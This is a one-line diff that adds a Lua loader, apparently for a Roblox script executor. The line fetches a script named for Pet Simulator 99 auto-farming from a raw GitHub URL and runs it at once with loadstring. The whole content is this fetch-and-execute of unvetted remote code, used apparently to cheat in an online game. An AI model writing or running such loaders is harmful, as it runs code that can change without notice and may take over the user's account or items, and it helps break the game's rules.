@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HaysGui/PS99FARM/main/Updated"))()
